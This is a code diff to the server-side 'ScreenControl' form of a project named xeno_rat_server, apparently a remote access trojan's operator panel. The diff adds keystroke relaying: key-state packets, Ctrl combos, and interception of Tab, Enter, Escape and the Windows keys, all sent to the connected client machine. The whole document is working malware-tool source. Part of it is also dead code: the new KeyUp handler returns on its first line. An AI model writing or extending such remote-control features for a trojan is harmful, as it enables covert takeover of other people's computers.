@@ -31,6 +31,11 @@ namespace xeno_rat_server.Forms
             comboBox2.Items.AddRange(qualitys);
             InitializeAsync();
 
+
+            this.KeyPreview = true;
+            pictureBox1.TabStop = true;
+            pictureBox1.Focus();
+
         }
 
         /// <summary>
@@ -612,7 +617,8 @@ namespace xeno_rat_server.Forms
         /// <param name="e">A KeyPressEventArgs that contains the event data.</param>
         private void ScreenControl_KeyPress(object sender, KeyPressEventArgs e)
         {
-            
+            if (ModifierKeys.HasFlag(Keys.Control))
+                e.Handled = true;
         }
 
         /// <summary>
@@ -620,10 +626,42 @@ namespace xeno_rat_server.Forms
         /// </summary>
         /// <param name="sender">The source of the event.</param>
         /// <param name="e">A KeyEventArgs that contains the event data.</param>
-        private void ScreenControl_KeyDown(object sender, KeyEventArgs e)
+        private async void ScreenControl_KeyUp(object sender, KeyEventArgs e)
         {
+            return;
+            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked)
+            {
+                e.SuppressKeyPress = true;
+                e.Handled = true;
+                return;
+            }
 
+            const int KEY_UP = 0;
+
+            // Reset modifier states
+            if (e.KeyCode == Keys.ControlKey || e.KeyCode == Keys.ShiftKey || e.KeyCode == Keys.Menu)
+            {
+                await SendKeyStateAsync(e.KeyCode, 0); // release modifier
+                e.Handled = true;
+                return;
+            }
+            if (e.KeyCode == Keys.Menu || e.KeyCode == Keys.LMenu || e.KeyCode == Keys.RMenu)
+            {
+                altDown = false;
+                await SendKeyStateAsync(Keys.Menu, KEY_UP);
+                e.SuppressKeyPress = true;
+                e.Handled = true;
+                return;
+            }
+
+            await SendKeyStateAsync(e.KeyCode, KEY_UP);
+            e.SuppressKeyPress = true;
+            e.Handled = true;
         }
+
+        bool ctrlDown = false;
+        bool shiftDown = false;
+        bool altDown = false;
 
         /// <summary>
         /// Handles the KeyUp event for screen control.
@@ -634,11 +672,136 @@ namespace xeno_rat_server.Forms
         /// This method checks if the current monitor size is null, if the picture box image is null, if the application is not playing, or if the checkbox is not checked, and then returns without performing any further action.
         /// If the conditions are met, it sends an asynchronous message to the client with the concatenated byte array consisting of 12 and the key value from the KeyEventArgs.
         /// </remarks>
-        private async void ScreenControl_KeyUp(object sender, KeyEventArgs e)
+        private async void ScreenControl_KeyDown(object sender, KeyEventArgs e)
         {
-            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
-            await client.SendAsync(client.sock.Concat(new byte[] { 12 }, client.sock.IntToBytes(e.KeyValue)));
+           if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked)
+                return;
+
+            // --- Handle Ctrl combos ---
+            if (e.Control)
+            {
+                if (e.KeyCode == Keys.A) { await SendKeyComboAsync(Keys.ControlKey, Keys.A); e.Handled = true; return; }
+                if (e.KeyCode == Keys.C) { await SendKeyComboAsync(Keys.ControlKey, Keys.C); e.Handled = true; return; }
+                if (e.KeyCode == Keys.S) { await SendKeyComboAsync(Keys.ControlKey, Keys.S); e.Handled = true; return; }
+                if (e.KeyCode == Keys.V) { await SendKeyComboAsync(Keys.ControlKey, Keys.V); e.Handled = true; return; }
+            }
+
+            /*if (e.Shift)
+            {
+                await SendKeyComboAsync(Keys.Shift, e.KeyCode);
+                e.Handled = true;
+                return;
+            }*/
+
+            if (e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin)
+            {
+                e.Handled = true;
+                e.SuppressKeyPress = true;
+                return;
+            }
+
+            // --- Handle letters & numbers (0-9) ---
+            if ((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z) || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9))
+            {
+                bool capsLockOn = Control.IsKeyLocked(Keys.CapsLock);
+                bool shiftDown = e.Shift;
+
+                Keys keyToSend = e.KeyCode;
+
+                // If CapsLock XOR Shift is active, convert to uppercase
+                if ((capsLockOn && !shiftDown) || (!capsLockOn && shiftDown))
+                {
+                    _ = SendKeyUppercaseAsync(keyToSend);
+                }
+                else
+                {
+                    _ = SendKeyAsync(keyToSend); // fire-and-forget   
+                }
+
+                e.Handled = true;
+                return;
+            }
+
+            // --- Handle other keys like Enter, Space ---
+            switch (e.KeyCode)
+            {
+                case Keys.Space:
+                case Keys.Enter:
+                case Keys.Back:
+                case Keys.Tab:
+                case Keys.Escape:
+                    _ = SendKeyAsync(e.KeyCode); // fire-and-forget
+                    e.Handled = true;
+                    break;
+                    // add more special keys here if needed
+            }
         }
+
+        protected override bool IsInputKey(Keys keyData)
+        {
+            if (keyData == Keys.Tab || keyData == Keys.LWin)
+                return true; // treat Tab as a regular input key
+            return base.IsInputKey(keyData);
+        }
+
+        private async Task SendKeyAsync(Keys key)
+        {
+            try
+            {
+                // Send KeyDown
+                await SendKeyStateAsync(key, 1); // 1 = KEY_DOWN
+
+                // Short delay to simulate real key press
+                await Task.Delay(20);
+
+                // Send KeyUp
+                await SendKeyStateAsync(key, 0); // 0 = KEY_UP
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"SendKeyAsync error: {ex.Message}");
+            }
+        }
+
+        private async Task SendKeyUppercaseAsync(Keys key)
+        {
+            try
+            {
+                // Press Shift
+                await SendKeyStateAsync(Keys.ShiftKey, 1); // KEY_DOWN
+                await Task.Delay(5); // short delay
+
+                // Press the actual key
+                await SendKeyStateAsync(key, 1); // KEY_DOWN
+                await Task.Delay(5); // short delay
+                await SendKeyStateAsync(key, 0); // KEY_UP
+
+                // Release Shift
+                await Task.Delay(5);
+                await SendKeyStateAsync(Keys.ShiftKey, 0); // KEY_UP
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"SendKeyUppercaseAsync error: {ex.Message}");
+            }
+        }
+
+        private async Task SendCharAsync(char c)
+        {
+            // Convert char to int bytes (little endian)
+            byte[] charBytes = client.sock.IntToBytes((int)c);
+            byte[] data = client.sock.Concat(new byte[] { 12 }, charBytes);
+            await client.SendAsync(data);
+        }
+
+        private async Task SendKeyStateAsync(Keys key, int state)
+        {
+            await client.SendAsync(client.sock.Concat(
+                new byte[] { 14 },
+                client.sock.IntToBytes(((int)key) | (state << 16))
+            ));
+        }
+
 
         /// <summary>
         /// Handles the CheckedChanged event of checkBox1 and updates the text based on the checked state.
@@ -658,6 +821,44 @@ namespace xeno_rat_server.Forms
             {
                 checkBox1.Text = "Disabled";
             }
+            this.Focus();
+            pictureBox1.TabStop = true;
+            pictureBox1.Focus();
+        }
+
+        private async Task SendKeyComboAsync(params Keys[] keys)
+        {
+            try
+            {
+                Console.WriteLine("SENDING KEY COMBO");
+                List<byte> packet = new List<byte>();
+                packet.Add(12); // command ID
+                packet.Add((byte)keys.Length);
+                foreach (var k in keys)
+                    packet.AddRange(client.sock.IntToBytes((int)k));
+
+                // Fire-and-forget sending
+                _ = client.SendAsync(packet.ToArray());
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"SendKeyComboAsync error: {ex.Message}");
+            }
+        }
+
+        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
+        {
+            if (!playing || !checkBox1.Checked || current_mon_size == null || pictureBox1.Image == null)
+                return base.ProcessCmdKey(ref msg, keyData);
+
+            // Intercept Tab key
+            if (keyData == Keys.Tab || keyData == Keys.Enter || keyData == Keys.Escape || keyData == Keys.LWin || keyData == Keys.RWin || keyData == Keys.Escape)
+            {
+                _ = SendKeyAsync(keyData);
+                return true;
+            }
+
+            return base.ProcessCmdKey(ref msg, keyData);
         }
 
         /// <summary>
